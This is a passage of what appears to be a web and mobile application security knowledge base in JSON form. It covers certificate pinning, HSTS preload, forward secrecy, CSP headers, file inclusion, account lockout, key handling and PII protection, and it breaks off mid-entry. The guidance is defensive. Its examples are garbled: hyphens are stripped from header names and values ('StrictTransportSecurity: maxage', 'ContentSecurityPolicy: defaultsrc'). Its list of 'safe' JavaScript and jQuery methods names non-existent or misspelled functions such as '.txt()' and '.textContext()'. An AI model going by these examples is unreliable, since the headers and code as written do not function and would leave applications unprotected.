"Description": "Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or ''pinned'' to the host. If more than one certificate or public key is acceptable, then the program holds a pinset (taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised identity must match one of the elements in the pinset. ",
"Solution": "The idea is to reuse the existing protocols and infrastructure, but use them in a hardened manner. For reuse, a program would keep doing the things it used to do when establishing a secure connection.To harden the channel, the program would take advantage of the OnConnect callback offered by a library, framework or platform. In the callback, the program would verify the remote host''s identity by validating its certificate or public key. While pinning does not have to occur in an OnConnect callback, it is often most convenient because the underlying connection information is readily available.For more extended information on different types of implementation please see: https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning "
},
{
"kbId": 169,
"title": "HSTS preload",
"Description": "HTTP StrictTransportSecurity (HSTS) allows sites to specify that they should be accessed via a secure connection only. The problem is, a user''s first request to a site employing HSTS may not be over HTTPS. A preload list will allow us to ship Firefox with some preset HSTS sites that, from the first time they''re accessed in the browser, will require a secure connection. ",
"Solution": "In order to be included on the HSTS preload list, your site must:1. Have a valid certificate (which must expire before 2016 if it uses SHA1). 2. Redirect all HTTP traffic to HTTPS\u2014i.e. be HTTPS only. 3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNS record for that subdomain exists. 4. Serve an HSTS header on the base domain: * Expiry must be at least eighteen weeks (10886400 seconds). * The includeSubdomains token must be specified. * The preload token must be specified. * If you are serving a redirect, that redirect must have the HSTS header, not the page it   redirects to.For more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTS header is required to confirm and authenticate your submission to the preload list. An example valid HSTS header:    StrictTransportSecurity: maxage=10886400; includeSubDomains; preloadAdding your website to the list: https://www.chromium.org/hsts      Source: https://wiki.mozilla.org/Privacy/Features/HSTS_Preload_List "
},
{
"kbId": 170,
"title": "Forward secrecy ciphers",
"Description": "In cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS) is a property of keyagreement protocols ensuring that a session key derived from a set of longterm keys cannot be compromised if one of the longterm keys is compromised in the future. The key used to protect the transmission of data must not be used to derive any additional keys, and if the key used to protect the transmission of data is derived from some other keying material, then that material must not be used to derive any more keys. In this way, compromise of a single key permits access only to data protected by that single key. ",
"Solution": "In the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.This step is the one that determines whether or not the future connection will have perfect forward secrecy. Note that, at this point, certificates have not entered the picture at all. This is because whether or not a connection has perfect forward secrecy is determined by how the session key is derived. And how the session key is derived is determined by the cipher suite in use. So, the cipher suites that use ephemeral DiffieHellman (DHE) or the elliptic curve variant (ECDHE) will have perfect forward secrecy while the other options will not. "
},
{
"kbId": 171,
"title": "OCSP stapling",
"Description": "OCSP stapling, formally known as the TLS Certificate Status Request extension, is an alternative approach to the Online Certificate Status Protocol (OCSP) for checking the revocation status of X.509 digital certificates. It allows the presenter of a certificate to bear the resource cost involved in providing OCSP responses by appending (\"stapling\") a timestamped OCSP response signed by the CA to the initial TLS Handshake, eliminating the need for clients to contact the CA ",
"Solution": "Stapling basically means that the certificate holder queries the OCSP server themselves at regular intervals, obtaining a signed timestamped OCSP response. When the site''s visitors attempt to connect to the site, this response is included (\"stapled\") with the TLS/SSL Handshake via the Certificate Status Request extension response (note: the TLS client must explicitly include a Certificate Status Request extension in its ClientHello TLS/SSL handshake message). While it may appear that allowing the site operator to control verification responses would allow a fraudulent site to issue false verification for a revoked certificate, the stapled responses can''t be forged as they need to be directly signed by the certificate authority, not the server. If the client does not receive a stapled response, it will just contact the OCSP server by itself. However, if the client receives an invalid stapled response, it will abort the connection. The only increased risk of OCSP stapling is that the notification of revocation for a certificate may be delayed until the lastsigned OCSP response expires.For more detailed information about Specification, Deployment, and limitation visit: https://en.wikipedia.org/wiki/OCSP_stapling "
},
{
"kbId": 172,
"title": "STRIDE",
"Description": "STRIDE is a collective for a series of vulnerabilities your applications should cover in order to harden your applications security.STRIDE stands for: Spoofing Tampering Repudiation Information Disclosure Elevation of privilege ",
"Solution": "The STRIDE was initially created as part of the process of threat modelling. STRIDE is a model of threats, used to help reason and find threats to a system. It is used in conjunction with a model of the target system that can be constructed in parallel. This includes a full breakdown of processes, data stores, data flows and trust boundaries.Today it is often used by security experts to help answer the question \"what can go wrong in this system we''re working on?\" "
},
{
"kbId": 173,
"title": "File inclusion attack",
"Description": "The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application. The vulnerability occurs due to the use of usersupplied input without proper validation. This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to: Code execution on the web server  Code execution on the clientside such as JavaScript which can lead to other attacks   such as crosssite scripting (XSS)  Denial of Service (DoS)  Sensitive Information Disclosure Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dotdotslash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. ",
"Solution": "The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml "
},
{
"kbId": 174,
"title": "Access management",
"Description": "Whenever your application contains administration and management functions you should put on restrictions for visiting these functionalities in order to reduce an attackers attack vector on your services since they are not directly accessible for them. ",
"Solution": "Verify that access to administration and management functions within the Web Service Application is limited to web service administrators.For example, they could only be accessible from within a restricted source IP range. "
},
{
"kbId": 175,
"title": "XML schema (XSD)",
"Description": "When adding schema''s to your or XML files you have better control over what type of userinput can be supplied in your application. This dramatically decreases an attacker\u2019s vector when implemented the right way. Nonetheless, you should always apply your own input validation and rejection as an extra layer of defense. This approach is also desirable since you also want to do countering and logging on the user\u2019s requests and input.\t  ",
"Solution": "Verify that XSD schema validation takes place to ensure a properly formed XML document, followed by validation of each input field before any processing of that data takes place."
},
{
"kbId": 176,
"title": "Limiting user input size",
"Description": "Whenever there is userinput supplied into your application you also want to limit the size of the userinput to appropriate maximum lengths. ",
"Solution": "Verify all the user input has been limited and the application only accepts expected input  lengths "
},
{
"kbId": 177,
"title": "Parsing data  exchange formats",
"Description": "Whenever you are parsing data exchange formats such as XML, JSON, CSV, etc, you have to make sure that whenever these data files contain malicious code this will not be executed by your application. You should also not solely depend on your parser to do all the encoding and escaping for you since there could always be an edge case that does execute certain attacks. ",
"Solution": "We highly recommend doing your own escaping, sanitizing, encoding on all data before entering your application. The risk also depends on the context of wherever you are putting this data into. So before you are doing any mutations with your data after getting it from the resources, make sure you have applied the right mitigations.Also, another reason to build an extra layer of escaping, sanitizing, encoding routines in your application is for the logging you want to apply on the data. Recommended knowledge base items: Input rejection  Input validation  Audit logs "
},
{
"kbId": 178,
"title": "Content security policy headers",
"Description": "The main use of the content security policy header is to, detect, report, and reject XSS attacks. The core issue in relation to XSS attacks is the browser''s inability to distinguish between a script that''s intended to be part of your application, and a script that''s been maliciously injected by a thirdparty. With the use of CSP(Content Security policy), we can tell the browser which script is safe to execute and which scripts are most likely been injected by an attacker. ",
"Solution": "A best practice for implementing CSP in your application would be to externalize all JavaScript within the web pages.So this:     ```     <script>       function doSomething() {         alert(''Something!'');       } \t</script>\t<button onclick=''doSomething();''>foobar!</button> ``` Must become this: ``` \t<script src=''doSomething.js''></script> \t<button id=''somethingToDo''>Let''s foobar!</button> ``` The header for this code could look something like:     ```     ContentSecurityPolicy: defaultsrc''self''; objectsrc''none''; scriptsrc''https://mycdn.com''     ``` Since it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the ''nonce''. Of course, this method is also very applicable on your existing code and designs. Now, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it''s important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack. Inline JavaScript example containing nonce: \t``` \t<script nonce=sfsdf03nceI23wlsgle9h3sdd21>     <! Your javscript code >     </script>     ``` Matching header example:     ```     ContentSecurityPolicy: scriptsrc ''noncesfsdf03nceI23wlsgle9h3sdd21''     ``` There is a whole lot more to learn about the CSP header for indepth implementation in your application. This knowledge base item just scratches the surface and it would be highly recommended to gain more indepth knowledge about this powerful header Very Important: When applying the CSP header, although it blocks XSS attacks. Your application still remains vulnerable to HTML and other code injections. So this is not a substitute for, validation, sanitizing and encoding of userinput. "
},
{
"kbId": 179,
"title": "Safe javascript jquery methods",
"Description": "Whenever you are supplying your JavaScript/jquery with data which is controlled by the user, you should make sure this data is not supplied towards functions which could interpreted the supplied and parse input as code. This could lead to XSS and other code injections. ",
"Solution": "Below we listed some safe functions for whenever it is needed to supply your JavaScript/jquery functions with userinput.JQUERY functions: .txt(); .val(); .parse();Example:       ```` \t<script> \tfunction myFunction() { \t\t$( \"p\" ).text( \"append userinput to paragrapgh safely\" ); \t} \t</script> \tJavscript functions: \t.innerText();   < not supported by firefox \t.textContext(); < not supported on I.E 8 and lower \t.createTextNode(); \t.value(); \t``` \t Example: \t``` \t<script> \tfunction myFunction() {    \t\tvar t = document.createTextNode(\"append userinput to body safely\");     \tdocument.body.appendChild(t); \t} \t</script> \t``` "
},
{
"kbId": 180,
"title": "WYSIWYG editors",
"Description": "WYSIWYG editors can be a great risk to your web application since it allows direct HTML as input to make the user perform styling on their submissions. This is why the editor should be put under a strict sanitation protocol to prevent injections.The first thing to take into consideration whenever you want to use WYSIWYG editors on your web application is to use as limited options as possible. Only the options which are necessary for your applications intended operation should be applied. This decreases the attackers attack vector drastically and leaves less room for error in your WYSIWYG editor in terms of your HTML sanitation.When providing your web application with an WYSIWYG editor you should also take note that most people just want to use bullets, make text bold or underline some text. They mostly do not understand half the functionalities the editors are providing. ",
"Solution": "Download a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sure you disable all unused components. The less options an attacker has to insert into your application the less his attack surface becomes. Also before implementing this HTML sanitizer on a production environment have it first thoroughly examined by security testers since it is a very delicate function. "
},
{
"kbId": 181,
"title": "Parsing JSON with Javascript",
"Description": "The eval() function evaluates or executes an argument.If the argument is an expression, eval() evaluates the expression. If the argument is one or more JavaScript statements, eval() executes the statements.This is exactly the reason why eval() should NEVER be used to parse JSON or other formats of data which could possible contain malicious code. ",
"Solution": "For the purpose of parsing JSON we would recommend the use of the json.parse functionality. Even though this function is more trusted you should always build your own security checks and encoding routines around the json.parse before mutating the data or passing it on to a view to be displayed in your HTML. "
},
{
"kbId": 182,
"title": "Account lockout",
"Description": "All applications should contain the possibility to lock down accounts for whenever it detects attacks by/on users. Also you should include options for both soft and hard lockout mechanisms. ",
"Solution": "Soft lockout: This can be a good option for protecting your users against brute force attacks. For example, whenever the user enters a wrong password three times, the application could lock down the account for a minute in order to slow down the process of brute forcing his password making it less profitable for the attacker to proceed. If u were to implement hard lockout countermeasures for this example you would achieve a \"Dos\" by permanently locking out accounts.Hard lockout: This type of lockout should be applied whenever you detect a user attacking your application and counter him by means of permanently locking out his account until a response team had time to do their forensics. After this process you can decide to give the user back his account or take further legal actions against him. This type of approach prevents the attacker from further penetrating your application and infrastructure.Note:  Be cautious that a softlockout countermeasure does not override a hardlockout status. "
},
{
"kbId": 183,
"title": "XML attacks",
"Description": "Whenever you are using XML in your application there are a few possibilities for injections depending on how you are applying XML in your system.Extensible Markup Language (XML) is a markup language that defines a set of rules for encoding documents in a format which is both humanreadable and machinereadable. It is defined by the W3C''s XML 1.0 Specification and by several other related specifications, all of which are free open standards. ",
"Solution": "Items listed below are recommended to read whenever you are planning to use XML in your application.Recommended knowledge base items: XML injection  External DTD parsing  XSLT injections  XPath injections  XXE injections "
},
{
"kbId": 184,
"title": "Centralized security controls",
"Description": "Whenever security controls do not have a centralized implementation there is a high probability for bugs or security issues being hidden into your application due to the loss of abstraction and duplication. ",
"Solution": "Make sure all your different type of security controls have a centralized place of implementation. Also verify that error handling logic in security controls denies access by default. "
},
{
"kbId": 185,
"title": "Data controller display layer separation",
"Description": "The application should separate data, controller, and display layers in order to make your application more clear and understandable in terms of abstraction due to separation.Whenever your application is more organized and abstracted it is much easier to implement less flawed security controls. ",
"Solution": "Make sure your different type of data layers are separated in your application.The separation of these different layers is also know as a design pattern which goes by the name MVC (model, view, controller). "
},
{
"kbId": 186,
"title": "Proven authentication mechanisms",
"Description": "Whenever your application has the option for users to authenticate themselves your method should be \"proven\" and secure in the sense of that:1. it should comply to some security standards/guidelines 2. Before implementing authentication on a live environment it has to be pentested/audited by    professionals. ",
"Solution": "Verify authentication mechanisms in the application are proven and verified against ASVS. "
},
{
"kbId": 187,
"title": "Administrative interfaces must not be accessible to untrusted parties",
"Description": "Whenever it is not necessary for administrative pages to be publicly accessible these pages should have restricted access for users. Whenever these pages are secluded from the rest of the application in terms of accessibility this could reduce the attack vector of malicious users. ",
"Solution": "The first solution is to grant access only from a certain source IP range to the administrative interface. If that solution would not be possible then it is always recommended to enforce a stepup or adaptive authentication for logging in into the administrative interface.Recommended knowledgebase item: Step up or adaptive authentication "
},
{
"kbId": 188,
"title": "Concurrent session handling",
"Description": "You should keep track of all the different active concurrent sessions. Whenever the application discovers concurrent sessions it should always notify the user about this and should give him the opportunity to end the other sessions.With this defense in place it becomes harder for attackers to hijack a users session since they will be notified about concurrent sessions. ",
"Solution": "The application should keep track and limit all the granted sessions. It should store your users IP address, session id and user id. After storing these credentials it should do regular checks to see if there are:1. Multiple active sessions linked to same user id 2. Multiple active sessions from different locations 3. Multiple active sessions from different devices 4. Limit and destroy sessions when they exceed an accepted threshold.The more critical the application becomes, the lower the accepted threshold for concurrent sessions should be. "
},
{
"kbId": 189,
"title": "Auto escaping technology",
"Description": "Some frameworks/templates have the option to autoescape all incoming userinput to harmless encoded data in order to prevent attacks. However, this autoescaping functionality is also optional to be disabled. Whenever this autoescaping function has been disabled your application might be vulnerable to attacks like XSS. ",
"Solution": "Whenever autoescaping functionality in your application has been disabled for whatever reason, you should make sure there is other protection in place like a HTML sanitizer in order to prevent attackers from injecting malicious code into your application. "
},
{
"kbId": 190,
"title": "Client side storage",
"Description": "Client side storage also known as Offline Storage or Web Storage. The Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it''s recommended not to store any sensitive information in local storage. ",
"Solution": "Verify that authenticated data is cleared from client storage, such as the browser DOM, after the session is terminated. This also goes for other session and local storage information which could assist an attacker launching an successful attack.Verify that data stored in client side storage (such as HTML5 local storage, session storage, IndexedDB, regular cookies or Flash cookies) does not contain sensitive data or PII (personal identifiable information). "
},
{
"kbId": 191,
"title": "Log rotation and seperation",
"Description": "Log separation is indispensable in order to prevent it from either radically downgrading your application its performance or even causing a Denial of service because the server becomes unavailable due to the flooding of logs. ",
"Solution": "Log rotation is an automated process used in system administration in which dated log files are archived. Servers which run large applications, such as LAMP stacks, often log every request: in the face of bulky logs, log rotation is a way to limit the total size of the logs while still allowing analysis of recent events.Log separation basically means that you have to store your log files on a different partition as where your OS/application is running on in order to avert a Denial of service attack or the downgrading of your application its performance. "
},
{
"kbId": 192,
"title": "HTTP strict transport security",
"Description": "HTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers. HSTS addresses the following threats:1. User bookmarks or manually types http://example.com and is subject to a maninthemiddle attacker    HSTS automatically redirects HTTP requests to HTTPS for the target domain 2. Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP    HSTS automatically redirects HTTP requests to HTTPS for the target domain 3. A maninthemiddle attacker attempts to intercept traffic from a victim user using an invalid certificate and     hopes the user will accept the bad certificate 4. HSTS does not allow a user to override the invalid certificate message ",
"Solution": "When users are visiting the application it should set the following header: These headers should be set in a base class which always sets the header no mather what page the users initially visit.Simple example, using a long (1 year) maxage:     StrictTransportSecurity: maxage=31536000If all present and future subdomains will be HTTPS:     StrictTransportSecurity: maxage=31536000; includeSubDomains CAUTION:  Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak.Cookies can be manipulated from subdomains, so omitting the include \"includeSubDomains\" option permits a broad range of cookierelated attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the \"Secure Flag\" is set on all cookies will also prevent, some, but not all, of the same attacks."
},
{
"kbId": 193,
"title": "API responses security headers",
"Description": "There are some security headers which should be properly configured in order to protect some API callbacks against Reflective File Download and other type of injections.Also check if the API response is dynamic, if user input is reflected in the response. If so, you must validate and encode the input, in order to prevent XSS and Same origin method execution attacks. ",
"Solution": "Sanitize your API''s input (in this case they should just allow alphanumeric); escaping is not sufficientVerify that all API responses contain XContentTypeOptions: nosniff, to prevent the browser from interpreting files as something else than declared by the content type (this helps prevent XSS if the page is interpreted as html or js).Add ''ContentDisposition: attachment; filename=\"filename.extension\"'' with extension corresponding the file extension and contenttype, on APIs that are not going to be rendered"
},
{
"kbId": 194,
"title": "Do not support untrusted client side technologies",
"Description": "When using unsupported client side technologies which are not supported natively via W3C browser standards. Your application could be open to different types of attacks. ",
"Solution": "Do not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies not supported natively via W3C browser standards. "
},
{
"kbId": 195,
"title": "Signed message payloads WS security",
"Description": "In order to establish trust between two communicating party''s such as servers and clients there message payload should be signed by means of public/private key method. This builds trust and makes it harder for attackers to impersonate different users.Web Services Security (WSSecurity, WSS) is an extension to SOAP to apply security to  Web services. It is a member of the Web service specifications and was published by OASIS.The protocol specifies how integrity and confidentiality can be enforced on messages and allows  the communication of various security token formats, such as Security Assertion Markup Language (SAML),  Kerberos, and X.509. Its main focus is the use of XML Signature and XML Encryption to provide endtoend security. ",
"Solution": "WSSecurity describes three main mechanisms:How to sign SOAP messages to assure integrity. Signed messages also provide nonrepudiation. How to encrypt SOAP messages to assure confidentiality. How to attach security tokens to ascertain the sender''s identity. The specification allows a variety of signature formats, encryption algorithms and multiple trust domains, and is open to various security token models, such as:X.509 certificates, Kerberos tickets, User ID/Password credentials, SAML Assertions, and customdefined tokens. The token formats and semantics are defined in the associated profile documents.WSSecurity incorporates security features in the header of a SOAP message, working in the application layer.These mechanisms by themselves do not provide a complete security solution for Web services. Instead, this specification is a building block that can be used in conjunction with other Web service extensions and higherlevel applicationspecific protocols to accommodate a wide variety of security models and security technologies. In general, WSS by itself does not provide any guarantee of security. When implementing and using the framework and syntax, it is up to the implementor to ensure that the result is not vulnerable.Key management, trust bootstrapping, federation and agreement on the technical details (ciphers, formats, algorithms) is outside the scope of WSSecurity. Use cases:Endtoend security If a SOAP intermediary is required, and the intermediary is not more or less trusted, messages need to be signed and optionally encrypted. This might be the case of an applicationlevel proxy at a network perimeter that will terminate TCP (transmission control protocol) connections.Nonrepudiation One method for nonrepudiation is to write transactions to an audit trail that is subject to specific security safeguards. Digital signatures, which WSSecurity supports, provide a more direct and verifiable nonrepudiation proof.Alternative transport bindings Although almost all SOAP services implement HTTP bindings, in theory other bindings such as JMS or SMTP could be used; in this case endtoend security would be required.Reverse proxy/common security token Even if the web service relies upon transport layer security, it might be required for the service to know about the end user, if the service is relayed by a (HTTP) reverse proxy. A WSS header could be used to convey the end user''s token, vouched for by the reverse proxy. "
},
{
"kbId": 196,
"title": "Hardware key vault",
"Description": "Keys should remain in a protected key vault at all times. In particular, ensure that there is a gap between the threat vectors that have direct access to the data and the threat vectors that have direct access to the keys. This implies that keys should not be stored on the application or web server (assuming that application attackers are part of the relevant threat model). ",
"Solution": "Verify that all consumers of cryptographic services do not have direct access to key material. Isolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM). "
},
{
"kbId": 197,
"title": "SOAP basic profile",
"Description": "Simple Soap Binding Profile is a specification from the Web Services Interoperability industry consortium. It is intended as a support profile for the WSI Basic Profile. This profile defines the way WSDL documents are to bind operations to a specific transport protocol SOAP. ",
"Solution": "Verify that the SOAP based web services are making use of the WSI Basic profile. To be compliant with this standard, it essentially means the application infrastructure must be TLS protected.Source: http://www.wsi.org/Profiles/SimpleSoapBindingProfile1.0.html "
},
{
"kbId": 198,
"title": "Strong CRYPTO through CA hierachy",
"Description": "When you have an offline PKI setup you need to have solid strong crypto layers. An attacker will look for weak chains in the hierarchy and abuse them when found. This can lead to ManInTheMiddle (MITM) attacks and impact the 3 security pillars C.I.A (Confidentiality, Integrity and Availability). ",
"Solution": "Verify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy, including root and intermediary certificates of your selected certifying authority. Because this is always in flux werecommend using the: SSLlabs free test https://www.ssllabs.com/ssltest/ OWASP OSAFT : https://www.owasp.org/index.php/OSaftThese TLS hardening recommendations can then be applied on all servers. "
},
{
"kbId": 199,
"title": "Build and deploy in a secure fashion",
"Description": "Using build platforms on premise or as a service is one of the core components in a SDLC. These build and deploy servers are sometimes not perfect for performing secure builds or deploys. This is because the lack of hardening of the OS for security improvements where the application could also benefit from this hardening. Also the access of third party services can lead to compromise of the secrets or integrity of the code of the application. ",
"Solution": "Building your application should always be done on a server that you trust, you are in control and has the latest security patches and hardening configured. For deploying the application the same rules apply, also think about what type of third party services can access the code or modify it. Creating scripts to monitor for bad behavior of a third party service can be an option as an extra quality control check. "
},
{
"kbId": 200,
"title": "Signed application components",
"Description": "When an application don''t use signed components an attacker can easily modify parts of the application and load inject a backdoors. Also the attacker could modify business logic in the application without notice. Signed application components can help harden your application and make it noticeable when an attacker tries to modify the code. ",
"Solution": "Create for the different components in the application signed signatures and verify these in the application at starting of the application and at runtime level. "
},
{
"kbId": 201,
"title": "Build proccess security hardening",
"Description": "Building an application should always be done on a server that you trust, you are in control of and has the latest security patches and hardening configured. In some applications you can use security techniques and modules that can protect your application from known security issues. Always use these techniques when they are available. ",
"Solution": "Ensure that build processes for system level languages have all security flags enabled, such as ASLR, DEP, and other security checks specific for your application need. "
},
{
"kbId": 202,
"title": "Sanitize unstructured data",
"Description": "Verify that unstructured data is sanitized to enforce generic safety measures. When this is not setup an attacker can use this unstructured data to harm the application and perform injections. ",
"Solution": "Unstructured data needs to be sanitized to enforce generic safety measures for example: allowed characters  character length,Also some characters are potentially harmful in given context and thus should be escaped. (e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O''Hara) "
},
{
"kbId": 203,
"title": "Zero keys and secrets before destroying them",
"Description": "Attackers are always on the lookout for secrets of a server or computer. When these secrets are accessible for an attacker because the key was not properly being destroyed then this can lead to security vulnerabilities. All secrets and keys should be completely erased from the memory since  an attacker could otherwise potentially retrieve these keys with memory dumping attacks on the application. ",
"Solution": "Secrets and keys should be erased from the memory and zeroed when they are no longer needed to prevent attackers from  doing memory dumping attacks.Also take into consideration the different Garbage collectors of your programming language. Whenever you zero out the keys of secret in question, you have no guarantee that a copy of it doesn''t exist elsewhere in memory. "
},
{
"kbId": 204,
"title": "Keys and passwords should be replaceable",
"Description": "It always can happen that you need the keys or the passwords of the application or in components that are needed by the application to work in a secure state. When these keys needs to be revoked because the password was leaked or an administrator leaving the company it''s always smart to have the possibility to revoke the keys or passwords without complications. ",
"Solution": "Verify in the application and components it uses that it''s possible to replace the used keys and passwords. Also replace default keys and passwords after the installation of the application. "
},
{
"kbId": 205,
"title": "Enforce random numbers are created with proper entropy at runtime",
"Description": "There are some techniques attackers use to decrease the entropy pool of the system so it will create weak and predictable ''random'' numbers that should not be used in crypto functions. ",
"Solution": "Enforce in your application that random numbers are created with proper entropy even when the application is under heavy load, or that the application degrades gracefully in such circumstances. "
},
{
"kbId": 206,
"title": "Segregated components",
"Description": "It''s always possible that an attacker can find a security flaw and abuse this to gain access to the server. From here the attacker tries to further infiltrate into the network and other important components of the application for example the database. This database should be firewalled correctly so it''s not accessible from the internet. Also this database has it own server and is in a different segment of the network. Always apply INGRESS and EGRESS filtering for all the servers used. ",
"Solution": "Verify that components are segregated from each other via a defined security control, such as network segmentation, firewall rules, or cloud based security groups. "
},
{
"kbId": 207,
"title": "PII protection",
"Description": "There should be extra care taken into account when you are dealing with  PII(personal identifiable information)   Fincancial data ( credit history, tax records, pay history, beneficiaries)  Health data (medical records, medical device details, or deanonymized research records)There are multiple laws in countries that demand proper protection by means of SSL/TLS for when the data is in transit and encrypted with pub priv key system when stored on the disk. This is needed to protect the user from identity theft and fraud. ",
"Solution": "Personally Identifiable Information needs to be stored encrypted at rest ideally in a secured environment such as your vault. In addition to being able to store secrets, a Vault can be used to encrypt/decrypt data that is stored elsewhere. The primary use of this is to allow applications to encrypt their data while still storing it in the primary data store.The benefit of this is that developers do not need to worry about how to properly encrypt data. The responsibility of encryption is on Vault and the security team managing it, and developers just encrypt/decrypt data as needed.Also, ensure that all communication goes via protected channels like SSL/TLS.  "
},
{
"kbId": 208,
"title": "Verify application is not vulnerable for known security issues",
"Description": "Whenever security researchers find a vulnerability in a library, modules, frameworks, platforms or  operating system, these vulnerabilities are reported and saved in the CVE list. CVE is a list of information security vulnerabilities and exposures that aims to provide  common names for  publicly known cyber security issues. The goal of CVE is to make it easier  to share data  across separate vulnerability capabilities (tools, repositories, and services)  with this \"common enumeration.\"Attackers can use these lists to find publicly known exploits which might exists in the target application.  A lot of popular CVE exploits also have exploits available in Metasploit or the Exploit database. This enables script kiddies to easily exploit the target applications services, libraries and operating systems. ",
"Solution": "Verify that all application components, libraries, modules, frameworks, platform, and operating systems are free from known vulnerabilities.This could be achieved with for example, strict patch management and periodic scanning of the environment for new issued CVEs''. It is also highly recommended to run the applications libraries and modules in the SDLC  through tools like OWASP dependency check. This tool checks imported modules and libraries for known CVEs''    https://www.owasp.org/index.php/OWASP_Dependency_Check "
},
{
"kbId": 209,
"title": "Disable autocomplete for all the input fields in forms",
"Description": "Browser autocomplete and password managers could be used by attackers to steal sensitive information. Whenever an application is susceptible to XSS (Cross site scripting) attacks, the attacker can inject forms into the application which are autocompleted by the browser.The attacker can then use JavaScript to read the input fields and steal credentials or other sensitive information. ",
"Solution": "The browser should explicitly be told for all the input fields that the autocomplete function should be turned off. The \"autocomplete=off\" HTML attribute should be added to all the input and hidden input fields in the form you want to disable the autocomplete of."
},
{
"kbId": 210,
"title": "All time sources should be synchronized",
"Description": "All time sources must be synchronized throughout. For example, different API servers or  microservices. to prevent logs to be tainted and become unusable for forensics. ",
"Solution": "Time sources should be synchronized to ensure logs have the correct time. If these time sources are not synchronized, the logs lose integrity and can become untrusted for investigators. "
},
{
"kbId": 211,
"title": "Generate strong crypto tokens with at least 120 bit of effective entropy",
"Description": "ID values stored on the device such as IMEI and UDID should not be used as authentication  tokens. These tokens are retrievable by other applications and thus warrant no integrity.   Using ID values from the mobile device also implies the use of static API tokens which is  considered insecure. These tokens cannot for example, expire or be invalidated by the application.   Whenever the application uses static tokens such as the ID values and this information is  leaked by a MiTM attack or leaked in another way then this attacker can now fully compromise  the user without being able to reject to expire or invalidate the static token EMEI or UDID for example.  ",
"Solution": "Authentication tokens should always be generic and should be cryptographically random strong  with at least 120 bit of effective entropy. The best way to implement these tokens is to go with proven methods that are tested on the effective level of entropy.For example JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and  selfcontained way for securely transmitting information between parties as a JSON object.  This information can be verified and trusted because it is digitally signed. JWTs can be  signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.  "
},
{
"kbId": 212,
"title": "Enforce sensitive information to be stored encrypted on device",
"Description": "The mobile application should not store sensitive data into unencrypted shared resources on the device. These resources can be accessible by other applications or  physically accessible whenever a device gets lost or stolen.  ",
"Solution": "Sensitive information should always be stored encrypted and preferably on the server side and retrieved using an object reference with proper authorization mechanisms in place. Do not implement an existing cryptographic algorithm on your own, no matter how easy  it appears. Instead, use widely accepted algorithms and widely accepted implementations.The cardinal rule of mobile apps is to not store data unless absolutely necessary.  As a developer you have to assume that the data is forfeited as soon as it touches the phone.  You also have to consider the implications of losing mobile users'' data to a silent  jailbreak or root exploit. "
},
{
"kbId": 213,
"title": "Encrypt sensitive information different depending on context",
"Description": "The mobile application should not store sensitive data in an unencrypted manner, even in the applications key chains since these can be easily accessed once a phone is jailbroken  or exploited the keychain can be easily read.  ",
"Solution": "Determine the context of where the sensitive information is being stored, is it a small  data set or is the data stored in a SQLite database. For every context determine the  applications platform recommended native options settings and follow these  recommendations accordingly.   "
},
{
"kbId": 214,
"title": "Secrets should be secure random generated",
"Description": "Secret keys, API tokens, or passwords must be dynamically generated. Whenever these tokens are not dynamically generated they can become predicable and used by attackers to compromise user accounts.  ",
"Solution": "When it comes to API tokens and secret keys these values have to be dynamically generated and valid only once. The secret token should be cryptographically ''random secure'', with at least 120 bit of effective entropy, salted with a unique and random 32bit value and hashed with an approved hashing (oneway) function.Passwords on the other hand should be created by the user himself, rather than assigning a user a dynamically generated password. The user should be presented a onetime link with a  cryptographically random token by means of an email or SMS which is used to activate his  account and provide a password of his own.   "
},
{
"kbId": 215,
"title": "Protection against different exfiltration techniques",
"Description": "The mobile application should not leak sensitive information. This information could be leaked for example whenever: Screenshots are saved in the current application as the primary  application is backgrounded   Sensitive information is written to the console of the mobile device  The Activitymanager should show the application name and a blank page and not show information ",
